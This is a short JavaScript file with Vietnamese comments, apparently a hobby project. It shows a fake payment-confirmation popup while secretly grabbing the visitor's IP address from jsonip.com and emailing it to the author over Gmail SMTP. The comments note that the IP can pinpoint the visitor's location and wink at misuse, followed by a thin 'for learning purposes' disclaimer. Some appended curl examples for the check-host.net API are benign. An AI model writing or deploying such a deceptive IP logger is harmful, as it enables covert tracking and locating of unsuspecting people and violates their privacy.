
//gửi pop up xác nhận 
function guixacnhan(){
    $.getJSON('https://jsonip.com/?callback=?').done(function(data) {
        var ip_address = window.JSON.parse(JSON.stringify(data, null, 2));
        ip_address = ip_address.ip;     
        //ip_address ở đây chính là địa chỉ của người truy cập , có nó có thể giúp biết chính xác người vừa truy cập đang ngồi ở chỗ nào thông qua ip dò đến bộ định tuyến mạng

        //giả vờ gửi thông tin xác nhận
        var a= document.getElementById("value").value   ;
        Swal.fire({
            title: 'Bạn có chắc chắn ',
            text: "Tôi sẽ phải trả cho bạn "+a+"  vnd",
            icon: 'warning',
            showCancelButton: true,
            confirmButtonColor: '#3085d6',
            cancelButtonColor: '#d33',
            confirmButtonText: 'Đúng!'
        }).then((result) => {
            if (result.isConfirmed) {
            Swal.fire(
                'Thành công!',
                'Tôi đã nhận được yêu cầu của bạn và sẽ liên hệ lại với bạn ngay',
                'success'
            )
            }
        })
        //gửi thông tin truy cập  về email của mình 
        Email.send({
            Host : "smtp.gmail.com",
            Username : "tài khoản email của bạn",
            Password : "mâtj khẩu",
            To : 'địa chỉ email muốn nhận thông báo ',
            From : "địa chỉ email gửi tin",
            Subject : "Có người truy cập vào đường dẫn của bạn",
            Body : "Số tiền yêu cầu : " +a
                +"\nCó một địa chỉ ip mới đã truy cập vào đường dẫn của bạn:  "+ip_address
        }).then(
        message => alert("Tin nhắn đã gửi thành công")
        ); 
    });
    $("#reset").hide();
}




// Kết quả kiểm tra có thể nhận được với một yêu cầu http :
// curl -H "Accept: application/json" \
//   https://check-host.net/check-result/<REQUEST_ID>

// {
//   {"us1.node.check-host.net": [[1, 0.131124019622803, "Moved Permanently", "301"]]}
// }
// Sử dụng các nút được chỉ định để kiểm tra
// curl -H "Accept: application/json" \
//   'https://check-host.net/check-tcp?host=google.com:443&node=us1.node.check-host.net&node=ch1.node.check-host.net'
// Phản ứng:
// {
//   "ok":             1,
//   "request_id":     "807dab",
//   "permanent_link": "https://check-host.net/check-report/807dab",
//   "nodes": {
//     "us1.node.check-host.net": ["us", "USA", "Los Angeles", "5.253.30.82", "AS18978"],
//     "ch1.node.check-host.net": ["ch", "Switzerland", "Zurich", "179.43.148.195", "AS50837"]
//   }
// }



//sau khi có ip của người truy cập thì các bạn biết phải làm gì rồi đó :))) 
//code với mục đích học tập không ủng hộ những mục đích xấu ⚠️⚠️



// Tài liệu và công nghệ sử dụng trong pj trên :
// 1.sweetalert2
// 2.sstmjs
// 3.jquery
// 3.https://fontawesome.com/
// 4.link ảnh sadboiz : https://saigonmetromall.com.vn/anh-buon-nam/

//by Văn : https://www.facebook.com/vawnnnn